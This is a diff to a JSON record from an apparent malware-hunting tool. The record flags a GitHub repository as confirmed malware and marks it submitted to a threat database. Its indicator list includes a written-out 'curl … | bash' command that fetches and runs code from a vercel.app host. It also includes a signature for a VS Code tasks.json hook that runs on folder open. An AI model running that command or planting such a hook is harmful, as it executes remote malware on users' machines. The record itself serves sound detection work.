@@ -2,6 +2,7 @@
   "finding": {
     "key": "repository:logixbuilttech/payload_posts",
     "kind": "repository",
+    "family": "",
     "id": "logixbuilttech/payload_posts",
     "url": "https://github.com/Logixbuilttech/payload_posts",
     "registry": "github",
@@ -18,8 +19,8 @@
     "iocs": "260120.vercel.app; https://260120.vercel.app/settings/linux?flag=9-test; https://260120.vercel.app/settings/win?flag=9-test; curl https://260120.vercel.app/settings/linux?flag=9-test | bash; .vscode/tasks.json",
     "matched_signatures": "folderOpen curl filename:tasks.json",
     "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 6)",
-    "osm_status": "not_submitted",
-    "osm_threat_id": "",
+    "osm_status": "submitted",
+    "osm_threat_id": "1c762e9b-368b-4ad9-8227-ccdbea3a0f9f",
     "first_seen": "hunt-20260928T024937Z",
     "last_seen": "hunt-20260928T024937Z",
     "evidence_file": "repositories/logixbuilttech_payload_posts.json",
